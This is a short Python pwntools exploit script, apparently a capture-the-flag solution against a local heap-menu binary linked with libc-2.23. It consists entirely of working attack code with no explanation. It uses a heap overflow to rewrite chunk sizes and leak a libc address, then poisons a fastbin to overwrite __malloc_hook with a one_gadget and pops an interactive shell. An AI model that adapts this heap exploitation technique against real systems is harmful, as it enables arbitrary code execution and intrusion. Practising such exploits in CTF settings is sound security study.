#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./program")
p = process("./program")
libc = ELF("libc-2.23.so")
gdb.attach(p,"init-pwndbg")

def allocate(size):
    p.sendlineafter('Command: ', '1')
    p.sendlineafter('Size: ', str(size))

def fill(index, content):
    size = len(content)
    p.sendlineafter('Command: ', '2')
    p.sendlineafter('Index: ', str(index))
    p.sendlineafter('Size: ', str(size))
    p.sendafter('Content: ', content)

def free(index):
    p.sendlineafter('Command: ', '3')
    p.sendlineafter('Index: ', str(index))

def dump(index):
    p.sendlineafter('Command: ', '4')
    p.sendlineafter('Index: ', str(index))
    p.recvuntil('Content: \n')

allocate(0x38)
allocate(0x88)
allocate(0x38)
free(1)
fill(0,b'a'*0x30+p64(0x0)+p64(0x92))
allocate(0x88)
dump(1)
leak = p.recvline()[:8]
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
libc.address = leak-0x399b78
log.critical("Libc base: {}".format(hex(libc.address)))
__malloc_hook = libc.sym.__malloc_hook
one_gadget = libc.address + 0x3f712
allocate(0x68)
allocate(0x68)
free(4)
fill(3,b'a'*0x60+p64(0x0)+p64(0x71)+p64(__malloc_hook-35))
allocate(0x68)
allocate(0x68)
fill(5,b'a'*19+p64(one_gadget))
allocate(1)
p.interactive()